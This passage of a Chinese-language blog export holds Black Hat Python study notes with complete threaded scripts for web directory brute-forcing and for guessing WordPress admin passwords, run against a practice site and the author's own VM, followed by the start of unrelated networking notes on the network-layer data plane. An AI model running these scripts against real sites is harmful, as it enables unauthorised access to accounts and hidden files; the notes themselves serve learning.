class="built_in">open</span>(WORDLIST) <span class="keyword">as</span> f:</span><br><span class="line">        raw_words = f.read()</span><br><span class="line"></span><br><span class="line">    found_resume = <span class="literal">False</span></span><br><span class="line">    words = queue.Queue()</span><br><span class="line">    <span class="keyword">for</span> word <span class="keyword">in</span> raw_words.split():</span><br><span class="line">        <span class="keyword">if</span> resume <span class="keyword">is</span> <span class="keyword">not</span> <span class="literal">None</span>:</span><br><span class="line">            <span class="keyword">if</span> found_resume:</span><br><span class="line">                extend_words(word)</span><br><span class="line">            <span class="keyword">elif</span> word == resume:</span><br><span class="line">                found_resume = <span class="literal">True</span></span><br><span class="line">                <span class="built_in">print</span>(<span class="string">f&#x27;Resuming wordlist from: <span class="subst">&#123;resume&#125;</span>&#x27;</span>)</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="built_in">print</span>(word)</span><br><span class="line">            extend_words(word)</span><br><span class="line">    <span class="keyword">return</span> words</span><br></pre></td></tr></table></figure>
<ol type="1">
<li><code>extend_words()</code>
函数的作用：在现有字典的内容上进行修改。word
为字典中的一个元素，假设它为 <code>name.ext</code>
，那么这就是一个文件，因此将 <code>/name.ext</code> 加入队列；如果它是
<code>name</code> ，那么这就是一个目录，因此将 <code>/name/</code>
加入队列（其实没差）。此外，有些时候网站会存在备份文件，比如
<code>index.php</code> 经过备份可能有 <code>index.php.bak</code>
，因此我们会在字典的内容上加上我们感兴趣的后缀，也加入队列</li>
<li><code>extend_words()</code> 是一个嵌套函数。这个函数只有
<code>get_words()</code> 使用，因此，直接写在内部。</li>
<li><code>resume</code>
的作用主要是出错的时候，不用从头读取字典中的元素，直接
<code>resume=name</code> 即可从字典中的 <code>name</code>
开始读取。</li>
</ol>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">dir_bruter</span>(<span class="params">words</span>):</span></span><br><span class="line">    headers = &#123;<span class="string">&#x27;User-Agent&#x27;</span>: AGENT&#125;</span><br><span class="line">    <span class="keyword">while</span> <span class="keyword">not</span> words.empty():</span><br><span class="line">        url = <span class="string">f&#x27;<span class="subst">&#123;TARGET&#125;</span><span class="subst">&#123;words.get()&#125;</span>&#x27;</span></span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            r = requests.get(url, headers=headers)</span><br><span class="line">            time.sleep(<span class="number">1</span>)</span><br><span class="line">        <span class="keyword">except</span> requests.exceptions.ConnectionError:</span><br><span class="line">            sys.stderr.write(<span class="string">&#x27;x&#x27;</span>)</span><br><span class="line">            sys.stderr.flush()</span><br><span class="line">            <span class="keyword">continue</span></span><br><span class="line">        <span class="keyword">if</span> r.status_code == <span class="number">200</span>:</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">f&#x27;\nSuccess (<span class="subst">&#123;url&#125;</span>: <span class="subst">&#123;r.status_code&#125;</span>)&#x27;</span>)</span><br><span class="line">        <span class="keyword">elif</span> r.status_code == <span class="number">404</span>:</span><br><span class="line">            sys.stderr.write(<span class="string">&#x27;.&#x27;</span>)</span><br><span class="line">            sys.stderr.flush()</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">f&#x27;\n<span class="subst">&#123;url&#125;</span> =&gt; <span class="subst">&#123;r.status_code&#125;</span>&#x27;</span>)</span><br></pre></td></tr></table></figure>
<p><code>dir_burter()</code> 的作用主要就是根据 <code>get_words()</code>
函数返回的队列，依次去访问队列中的文件名，如果状态码为 200 表示成功，
404 表示失败，其他则显示出来。</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:  </span><br><span class="line">    words = get_words()  </span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&#x27;Press enter to continue.&#x27;</span>)  </span><br><span class="line">    sys.stdin.readline()  </span><br><span class="line">    <span class="keyword">for</span> _ <span class="keyword">in</span> <span class="built_in">range</span>(THREADS):  </span><br><span class="line">        t = threading.Thread(target=dir_bruter, args=(words,))  </span><br><span class="line">        t.start()</span><br></pre></td></tr></table></figure>
<p>运行结果：</p>
<p><img
src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220623211849.png" /></p>
<p>200 和其他状态码会显示出来，而 404 则会用 <code>.</code>
表示。小技巧，如果不想看到标准错误，可以执行：</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">python3 bruter.py 2&gt;/dev/null # 将标准错误重定向到 /dev/null</span><br></pre></td></tr></table></figure>
<p><img
src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220623212441.png" /></p>
<h1 id="html-表单认证爆破">3. HTML 表单认证爆破</h1>
<blockquote>
<p>不要尝试对别人的主机进行爆破！不要尝试对别人的主机进行爆破！不要尝试对别人的主机进行爆破！我爆破的是自己的虚拟机。</p>
</blockquote>
<p>本节的内容是爆破表单认证！</p>
<p><img
src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220623225237.png" /></p>
<blockquote>
<p>需要注意，现在很多的网站都做了许多工作防止爆破。最常见的就是各种验证码、google的选择各种图片还有错误次数限制。所幸
wordpress 并没有这些，wordpress 只有一个
testcookie，这个可以在页面源码中得到，我们 post
请求的时候需要带上这个值，否则即使密码正确也无法登录。</p>
</blockquote>
<p>访问
<code>http://target/wp-login.php</code>，然后查看页面源码，找到表单提交的部分（<code>form</code>）</p>
<p><img
src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220623225825.png" /></p>
<p>这里面需要提交的参数是（<code>input</code> 标签中的 <code>name</code>
属性的值）：</p>
<ul>
<li><code>log</code> 用户名</li>
<li><code>pwd</code> 密码</li>
<li><code>rememberme</code> 网页中的 “记住我”</li>
<li><code>wp-submit</code> 网页中的 “登录”</li>
<li><code>redirect_to</code> 登录成功之后需要重定向到的页面</li>
<li><code>testcookie</code></li>
</ul>
<p>这些参数的值就在对应的 <code>input</code> 标签中的 <code>value</code>
属性中携带，如果 <code>value</code>
为空，则说明需要我们填写（比如用户名和密码）。</p>
<p>因此，HTML 表单认证爆破需要做这些事：</p>
<ol type="1">
<li>获得（密码）字典内容</li>
<li>先请求登录界面，使用 <code>session</code>，可以保证 TCP
连接不断开，因此 <code>testcookie</code>
也就不会发生变化。将源码中的上述 6 个参数和对应的值保存</li>
<li>一般而言，用户名不变，因此将用户名参数的值填入，然后每次爆破都需要将字典中的内容当作密码填入。这
6 个参数将作为 post 请求的 <code>data</code></li>
<li>如果密码正确，则会重定向那另一个界面，这个界面中有这么一串内容
“欢迎使用WordPress！”。因此，可以把这串内容作为判定依据。如果 post
请求得到的内容没有这句话，则密码错误，否则密码正确，爆破结束。</li>
</ol>
<p>获得密码字典内容：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">get_words</span>():</span></span><br><span class="line">    <span class="keyword">with</span> <span class="built_in">open</span>(WORDLIST, <span class="string">&#x27;r&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line">        raw_words = f.read()</span><br><span class="line"></span><br><span class="line">    words = queue.Queue()</span><br><span class="line">    <span class="keyword">for</span> word <span class="keyword">in</span> raw_words.split():</span><br><span class="line">        words.put(word)</span><br><span class="line">    <span class="keyword">return</span> words</span><br></pre></td></tr></table></figure>
<p>从页面源码中获得参数名和值：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">get_params</span>(<span class="params">content</span>):</span></span><br><span class="line">    params = <span class="built_in">dict</span>()</span><br><span class="line">    soup = BeautifulSoup(content, <span class="string">&#x27;lxml&#x27;</span>)</span><br><span class="line">    <span class="keyword">for</span> item <span class="keyword">in</span> soup.find_all(<span class="string">&#x27;input&#x27;</span>): <span class="comment"># 只有这 6 个是 input 标签</span></span><br><span class="line">        name = item.get(<span class="string">&#x27;name&#x27;</span>) <span class="comment"># 获得 name 属性的值</span></span><br><span class="line">        <span class="keyword">if</span> name <span class="keyword">is</span> <span class="keyword">not</span> <span class="literal">None</span>:</span><br><span class="line">            params[name] = item.get(<span class="string">&#x27;value&#x27;</span>) <span class="comment"># 获得 value 属性的值</span></span><br><span class="line">    <span class="keyword">return</span> params</span><br></pre></td></tr></table></figure>
<p>这个函数的执行结果为：</p>
<p><img
src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220623231359.png" /></p>
<p>接下来就是重要的爆破的代码：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Bruter</span>:</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__init__</span>(<span class="params">self, username, url</span>):</span></span><br><span class="line">        self.username = username</span><br><span class="line">        self.url = url</span><br><span class="line">        self.found = <span class="literal">False</span></span><br><span class="line">        <span class="built_in">print</span>(<span class="string">f&#x27;\nBrute Force Attack begining on <span class="subst">&#123;url&#125;</span>.\n&#x27;</span>)</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;Finished the setup where username = %s\n&quot;</span> % username)</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">run_bruteforce</span>(<span class="params">self, passwords</span>):</span></span><br><span class="line">        <span class="keyword">for</span> _ <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">10</span>):</span><br><span class="line">            t = threading.Thread(target=self.web_bruter, args=(passwords, ))</span><br><span class="line">            t.start()</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">web_bruter</span>(<span class="params">self, passwords</span>):</span></span><br><span class="line">        session = requests.session()</span><br><span class="line">        r0 = session.get(self.url)</span><br><span class="line">        params = get_params(r0.content)</span><br><span class="line">        params[<span class="string">&#x27;log&#x27;</span>] = self.username</span><br><span class="line"></span><br><span class="line">        <span class="keyword">while</span> <span class="keyword">not</span> passwords.empty() <span class="keyword">and</span> <span class="keyword">not</span> self.found:</span><br><span class="line">            time.sleep(<span class="number">5</span>)</span><br><span class="line">            passwd = passwords.get()</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">f&#x27;Trying username/password: <span class="subst">&#123;self.username&#125;</span>/<span class="subst">&#123;passwd:&lt;<span class="number">10</span>&#125;</span>&#x27;</span>)</span><br><span class="line">            params[<span class="string">&#x27;pwd&#x27;</span>] = passwd</span><br><span class="line"></span><br><span class="line">            r1 = session.post(self.url, data=params)</span><br><span class="line">            <span class="keyword">if</span> SUCCESS <span class="keyword">in</span> r1.content.decode():</span><br><span class="line">                self.found = <span class="literal">True</span></span><br><span class="line">                <span class="built_in">print</span>(<span class="string">f&#x27;\nBruteforcing successful.&#x27;</span>)</span><br><span class="line">                <span class="built_in">print</span>(<span class="string">f&#x27;Username is <span class="subst">&#123;self.username&#125;</span>&#x27;</span>)</span><br><span class="line">                <span class="built_in">print</span>(<span class="string">f&#x27;Password is <span class="subst">&#123;passwd&#125;</span>\n&#x27;</span>)</span><br><span class="line">                <span class="built_in">print</span>(<span class="string">&#x27;done: now cleaning up other threads...&#x27;</span>) <span class="comment"># 并没有 cleaning up，这就是一句空话</span></span><br></pre></td></tr></table></figure>
<p>主要就是 <code>web_bruter()</code> 方法，首先
<code>r0 = session.get(self.url)</code> 就是第一次访问登录界面，然后调用
<code>params = get_params(r0.content)</code> 获得参数，接着
<code>params['log'] = self.username</code>
填入用户名，随后就可以开始爆破了。每次爆破都从 passwords
队列中获得一个密码，然后 <code>params['pwd'] = passwd</code>
填入密码，使用<code>r1 = session.post(self.url, data=params)</code>
尝试登录，如果 <code>if SUCCESS in r1.content.decode()</code>
则密码正确， <code>SUCCESS</code> 就是
<code>'欢迎使用WordPress！'</code>，否则继续爆破。</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    words = get_words() <span class="comment"># 获得密码的队列</span></span><br><span class="line">    b = Bruter(<span class="string">&#x27;admin&#x27;</span>, TARGET)</span><br><span class="line">    b.run_bruteforce(words) <span class="comment"># 尝试爆破</span></span><br></pre></td></tr></table></figure>
<p>运行结果：</p>
<p><img
src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220623232220.png" /></p>
<p>利用这个密码可以成功登录。后期可以优化一下，找到密码则退出运行中的所有线程。</p>
<h1 id="附件">4. 附件</h1>
<h2 id="开源-cms-路径扫描源码">4.1. 开源 CMS 路径扫描源码</h2>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> contextlib, os, queue, requests, sys, threading, time</span><br><span class="line"></span><br><span class="line">FILETERED = [<span class="string">&#x27;.jpg&#x27;</span>, <span class="string">&#x27;gif&#x27;</span>, <span class="string">&#x27;png&#x27;</span>, <span class="string">&#x27;css&#x27;</span>]</span><br><span class="line">TARGET = <span class="string">&#x27;http://target&#x27;</span></span><br><span class="line">THREADS = <span class="number">10</span></span><br><span class="line">answers = queue.Queue()</span><br><span class="line">web_paths = queue.Queue()</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">gather_paths</span>():</span></span><br><span class="line">    <span class="keyword">for</span> root, dirs, files <span class="keyword">in</span> os.walk(<span class="string">&#x27;.&#x27;</span>):</span><br><span class="line">        <span class="keyword">for</span> fname <span class="keyword">in</span> files:</span><br><span class="line">            <span class="keyword">if</span> os.path.splitext(fname)[<span class="number">1</span>] <span class="keyword">in</span> FILETERED:</span><br><span class="line">                <span class="keyword">continue</span></span><br><span class="line">            path = os.path.join(root, fname)</span><br><span class="line">            <span class="keyword">if</span> path.startswith(<span class="string">&#x27;.&#x27;</span>):</span><br><span class="line">                path = path[<span class="number">1</span>:]</span><br><span class="line">            <span class="built_in">print</span>(path)</span><br><span class="line">            web_paths.put(path)</span><br><span class="line"></span><br><span class="line"><span class="meta">@contextlib.contextmanager</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">chdir</span>(<span class="params">path</span>):</span></span><br><span class="line">    <span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">    On enter, change directory to specified path.</span></span><br><span class="line"><span class="string">    On exit, change directory back to original.</span></span><br><span class="line"><span class="string">    &#x27;&#x27;&#x27;</span></span><br><span class="line">    this_dir = os.getcwd()</span><br><span class="line">    os.chdir(path)</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        <span class="keyword">yield</span></span><br><span class="line">    <span class="keyword">finally</span>:</span><br><span class="line">        os.chdir(this_dir)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">test_remote</span>():</span></span><br><span class="line">    <span class="keyword">while</span> <span class="keyword">not</span> web_paths.empty():</span><br><span class="line">        path = web_paths.get()</span><br><span class="line">        url = <span class="string">f&#x27;<span class="subst">&#123;TARGET&#125;</span><span class="subst">&#123;path&#125;</span>&#x27;</span></span><br><span class="line">        time.sleep(<span class="number">2</span>)</span><br><span class="line">        <span class="comment"># print(f&#x27;test: &#123;url&#125;&#x27;)</span></span><br><span class="line">        r = requests.get(url)</span><br><span class="line">        <span class="keyword">if</span> r.status_code == <span class="number">200</span>:</span><br><span class="line">            answers.put(url)</span><br><span class="line">            sys.stdout.write(<span class="string">&#x27;+&#x27;</span>)</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            sys.stdout.write(<span class="string">&#x27;x&#x27;</span>)</span><br><span class="line">        sys.stdout.flush()</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">run</span>():</span></span><br><span class="line">    mythreads = <span class="built_in">list</span>()</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(THREADS):</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">f&#x27;Spawning thread <span class="subst">&#123;i&#125;</span>&#x27;</span>)</span><br><span class="line">        t = threading.Thread(target=test_remote)</span><br><span class="line">        mythreads.append(t)</span><br><span class="line">        t.start()</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> thread <span class="keyword">in</span> mythreads:</span><br><span class="line">        thread.join()</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    <span class="keyword">with</span> chdir(<span class="string">&#x27;/home/m1ku/Downloads/wordpress/&#x27;</span>):</span><br><span class="line">        gather_paths()</span><br><span class="line">    <span class="built_in">input</span>(<span class="string">&#x27;Press return to continue&#x27;</span>)</span><br><span class="line">    run()</span><br><span class="line">    <span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&#x27;myanswers.txt&#x27;</span>, <span class="string">&#x27;w&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line">        <span class="keyword">while</span> <span class="keyword">not</span> answers.empty():</span><br><span class="line">            f.write(<span class="string">f&#x27;<span class="subst">&#123;answers.get()&#125;</span>\n&#x27;</span>)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&#x27;done&#x27;</span>)</span><br></pre></td></tr></table></figure>
<h2 id="暴力路径扫描-1">4.2. 暴力路径扫描</h2>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> queue, requests, threading, sys, time</span><br><span class="line"></span><br><span class="line">AGENT = <span class="string">&#x27;Mozilla/5.0 (X11; Linux x86_64; rv:19.0) Gecko/20100101 FIrefox/19.0&#x27;</span></span><br><span class="line">EXTENSIONS = [<span class="string">&#x27;.php&#x27;</span>, <span class="string">&#x27;.bak&#x27;</span>, <span class="string">&#x27;.orig&#x27;</span>, <span class="string">&#x27;.inc&#x27;</span>] <span class="comment"># 感兴趣的后缀</span></span><br><span class="line">TARGET = <span class="string">&#x27;http://testphp.vulnweb.com/&#x27;</span>  <span class="comment"># 目标网站</span></span><br><span class="line">THREADS = <span class="number">50</span></span><br><span class="line">WORDLIST = <span class="string">&#x27;/usr/share/dirb/wordlists/small.txt&#x27;</span> <span class="comment"># 使用一个小点的字典</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">get_words</span>(<span class="params">resume=<span class="literal">None</span></span>):</span></span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">extend_words</span>(<span class="params">word</span>):</span></span><br><span class="line">        <span class="keyword">if</span> <span class="string">&#x27;.&#x27;</span> <span class="keyword">in</span> word:</span><br><span class="line">            words.put(<span class="string">f&#x27;/<span class="subst">&#123;word&#125;</span>&#x27;</span>)</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            words.put(<span class="string">f&#x27;/<span class="subst">&#123;word&#125;</span>/&#x27;</span>)</span><br><span class="line"></span><br><span class="line">        <span class="keyword">for</span> extension <span class="keyword">in</span> EXTENSIONS:</span><br><span class="line">            words.put(<span class="string">f&#x27;/<span class="subst">&#123;word&#125;</span><span class="subst">&#123;extension&#125;</span>&#x27;</span>)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">with</span> <span class="built_in">open</span>(WORDLIST) <span class="keyword">as</span> f:</span><br><span class="line">        raw_words = f.read()</span><br><span class="line"></span><br><span class="line">    found_resume = <span class="literal">False</span></span><br><span class="line">    words = queue.Queue()</span><br><span class="line">    <span class="keyword">for</span> word <span class="keyword">in</span> raw_words.split():</span><br><span class="line">        <span class="keyword">if</span> resume <span class="keyword">is</span> <span class="keyword">not</span> <span class="literal">None</span>:</span><br><span class="line">            <span class="keyword">if</span> found_resume:</span><br><span class="line">                extend_words(word)</span><br><span class="line">            <span class="keyword">elif</span> word == resume:</span><br><span class="line">                found_resume = <span class="literal">True</span></span><br><span class="line">                <span class="built_in">print</span>(<span class="string">f&#x27;Resuming wordlist from: <span class="subst">&#123;resume&#125;</span>&#x27;</span>)</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="built_in">print</span>(word)</span><br><span class="line">            extend_words(word)</span><br><span class="line">    <span class="keyword">return</span> words</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">dir_bruter</span>(<span class="params">words</span>):</span></span><br><span class="line">    headers = &#123;<span class="string">&#x27;User-Agent&#x27;</span>: AGENT&#125;</span><br><span class="line">    <span class="keyword">while</span> <span class="keyword">not</span> words.empty():</span><br><span class="line">        url = <span class="string">f&#x27;<span class="subst">&#123;TARGET&#125;</span><span class="subst">&#123;words.get()&#125;</span>&#x27;</span></span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            r = requests.get(url, headers=headers)</span><br><span class="line">            time.sleep(<span class="number">1</span>)</span><br><span class="line">        <span class="keyword">except</span> requests.exceptions.ConnectionError:</span><br><span class="line">            sys.stderr.write(<span class="string">&#x27;x&#x27;</span>)</span><br><span class="line">            sys.stderr.flush()</span><br><span class="line">            <span class="keyword">continue</span></span><br><span class="line">        <span class="keyword">if</span> r.status_code == <span class="number">200</span>:</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">f&#x27;\nSuccess (<span class="subst">&#123;url&#125;</span>: <span class="subst">&#123;r.status_code&#125;</span>)&#x27;</span>)</span><br><span class="line">        <span class="keyword">elif</span> r.status_code == <span class="number">404</span>:</span><br><span class="line">            sys.stderr.write(<span class="string">&#x27;.&#x27;</span>)</span><br><span class="line">            sys.stderr.flush()</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">f&#x27;\n<span class="subst">&#123;url&#125;</span> =&gt; <span class="subst">&#123;r.status_code&#125;</span>&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    words = get_words()</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&#x27;Press enter to continue.&#x27;</span>)</span><br><span class="line">    sys.stdin.readline()</span><br><span class="line">    <span class="keyword">for</span> _ <span class="keyword">in</span> <span class="built_in">range</span>(THREADS):</span><br><span class="line">        t = threading.Thread(target=dir_bruter, args=(words,))</span><br><span class="line">        t.start()</span><br></pre></td></tr></table></figure>
<h2 id="html-表单认证爆破-1">4.3. HTML 表单认证爆破</h2>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> bs4 <span class="keyword">import</span> BeautifulSoup</span><br><span class="line"><span class="keyword">import</span> queue, requests, sys, threading, time</span><br><span class="line"></span><br><span class="line">SUCCESS = <span class="string">&#x27;欢迎使用WordPress！&#x27;</span></span><br><span class="line">TARGET = <span class="string">&#x27;http://10.0.2.21/wp-login.php&#x27;</span></span><br><span class="line">WORDLIST = <span class="string">&#x27;wordlist_test.txt&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">get_words</span>():</span></span><br><span class="line">    <span class="keyword">with</span> <span class="built_in">open</span>(WORDLIST, <span class="string">&#x27;r&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line">        raw_words = f.read()</span><br><span class="line"></span><br><span class="line">    words = queue.Queue()</span><br><span class="line">    <span class="keyword">for</span> word <span class="keyword">in</span> raw_words.split():</span><br><span class="line">        words.put(word)</span><br><span class="line">    <span class="keyword">return</span> words</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">get_params</span>(<span class="params">content</span>):</span></span><br><span class="line">    params = <span class="built_in">dict</span>()</span><br><span class="line">    soup = BeautifulSoup(content, <span class="string">&#x27;lxml&#x27;</span>)</span><br><span class="line">    <span class="keyword">for</span> item <span class="keyword">in</span> soup.find_all(<span class="string">&#x27;input&#x27;</span>):</span><br><span class="line">        name = item.get(<span class="string">&#x27;name&#x27;</span>)</span><br><span class="line">        <span class="keyword">if</span> name <span class="keyword">is</span> <span class="keyword">not</span> <span class="literal">None</span>:</span><br><span class="line">            params[name] = item.get(<span class="string">&#x27;value&#x27;</span>)</span><br><span class="line">    <span class="keyword">return</span> params</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Bruter</span>:</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__init__</span>(<span class="params">self, username, url</span>):</span></span><br><span class="line">        self.username = username</span><br><span class="line">        self.url = url</span><br><span class="line">        self.found = <span class="literal">False</span></span><br><span class="line">        <span class="built_in">print</span>(<span class="string">f&#x27;\nBrute Force Attack begining on <span class="subst">&#123;url&#125;</span>.\n&#x27;</span>)</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;Finished the setup where username = %s\n&quot;</span> % username)</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">run_bruteforce</span>(<span class="params">self, passwords</span>):</span></span><br><span class="line">        <span class="keyword">for</span> _ <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">10</span>):</span><br><span class="line">            t = threading.Thread(target=self.web_bruter, args=(passwords, ))</span><br><span class="line">            t.start()</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">web_bruter</span>(<span class="params">self, passwords</span>):</span></span><br><span class="line">        session = requests.session()</span><br><span class="line">        r0 = session.get(self.url)</span><br><span class="line">        params = get_params(r0.content)</span><br><span class="line">        params[<span class="string">&#x27;log&#x27;</span>] = self.username</span><br><span class="line"></span><br><span class="line">        <span class="keyword">while</span> <span class="keyword">not</span> passwords.empty() <span class="keyword">and</span> <span class="keyword">not</span> self.found:</span><br><span class="line">            time.sleep(<span class="number">5</span>)</span><br><span class="line">            passwd = passwords.get()</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">f&#x27;Trying username/password: <span class="subst">&#123;self.username&#125;</span>/<span class="subst">&#123;passwd:&lt;<span class="number">10</span>&#125;</span>&#x27;</span>)</span><br><span class="line">            params[<span class="string">&#x27;pwd&#x27;</span>] = passwd</span><br><span class="line"></span><br><span class="line">            r1 = session.post(self.url, data=params)</span><br><span class="line">            <span class="keyword">if</span> SUCCESS <span class="keyword">in</span> r1.content.decode():</span><br><span class="line">                self.found = <span class="literal">True</span></span><br><span class="line">                <span class="built_in">print</span>(<span class="string">f&#x27;\nBruteforcing successful.&#x27;</span>)</span><br><span class="line">                <span class="built_in">print</span>(<span class="string">f&#x27;Username is <span class="subst">&#123;self.username&#125;</span>&#x27;</span>)</span><br><span class="line">                <span class="built_in">print</span>(<span class="string">f&#x27;Password is <span class="subst">&#123;passwd&#125;</span>\n&#x27;</span>)</span><br><span class="line">                <span class="built_in">print</span>(<span class="string">&#x27;done: now cleaning up other threads...&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    words = get_words()</span><br><span class="line">    b = Bruter(<span class="string">&#x27;admin&#x27;</span>, TARGET)</span><br><span class="line">    b.run_bruteforce(words)</span><br></pre></td></tr></table></figure>
]]></content>
      <categories>
        <category>python</category>
        <category>black_hat_python</category>
      </categories>
      <tags>
        <tag>python</tag>
        <tag>black_hat_python</tag>
      </tags>
  </entry>
  <entry>
    <title>第 4 章 网络层：数据平面</title>
    <url>/2022/06/05/%E7%AC%AC%204%20%E7%AB%A0%20%E7%BD%91%E7%BB%9C%E5%B1%82%EF%BC%9A%E6%95%B0%E6%8D%AE%E5%B9%B3%E9%9D%A2/</url>
    <content><![CDATA[<p>个人的知识笔记。</p>
<span id="more"></span>
<h1 id="导论">1. 导论</h1>
<h2 id="网络层服务">1.1. 网络层服务</h2>
<p>网络层的服务有：</p>
<ol type="1">
<li>在发送主机和接收主机之家传送段(segment)</li>
<li>在发送端将段封装到数据报（不是UDP数据报）中</li>
<li>在接收端，将段上交给传输层实体</li>
<li>网络层的协议存在于<strong>每一个</strong>主机和路由器</li>
<li>路由器检查每一个经过它的IP数据报的头部</li>
</ol>
<p><img
src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220604213409.png" /></p>
<h2 id="网络层的关键功能">1.2. 网络层的关键功能</h2>
<p>网络层有三个关键功能：</p>
<ol type="1">
<li><strong>转发</strong>：将分组从路由器的输入接口转发到合适的输出接口</li>
<li><strong>路由</strong>：使用路由算法来决定分组从发送主机到目标主机的路径</li>
<li><strong>连接建立</strong>：分组传输之前，在两个主机之间通过一些路由器所构成的路径上建立一个网络层连接（有连接）[[#1
5 连接建立]]</li>
</ol>
<p>其中，转发和路由是所有网络架构的关键功能，而连接建立只有在某些网络架构中存在。</p>
<p>转发可以看的出来是针对单个分组的，并且只局限于单个路由器。而路由是全局的，涉及发送主机到目标主机路径之间的所有路由器。</p>
<blockquote>
<p>路由器的端口：路由器的端口都是双向的，既可以输入，也可以输出。这里的输入接口特指接收分组的那个接口，输出接口特指转发分组的接口。</p>
</blockquote>
<h2 id="网络层分平面">1.3. 网络层分平面</h2>
<p>网络层可以分为两个平面：</p>
<ol type="1">
<li>数据平面(data plane)</li>
<li>控制平面(control plane)</li>
</ol>
<p>其中，数据平面是本地的，单个路由器可以完成的功能都属于数据平面。比如刚刚说的转发功能。</p>
<p>控制平面是网络范围内的逻辑，也就是全局的。比如说刚刚的路由就是该平面的功能。</p>
<p>本章节主要描述的就是数据平面。</p>
<h2 id="路由在控制平面的实现">1.4. 路由在控制平面的实现</h2>
<p>路由时控制平面的功能，其实现有两种方法：</p>
<ol type="1">
<li>传统的方法</li>
<li>SDN方法</li>
</ol>
<h3 id="传统的方法">1.4.1. 传统的方法</h3>
<p><img
src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220604214239.png" /></p>
<p>如上图：</p>
<ol type="1">
<li>每个路由器的控制平面互相交互，从而得到路由表</li>
<li>将路由表交给数据平面使用</li>
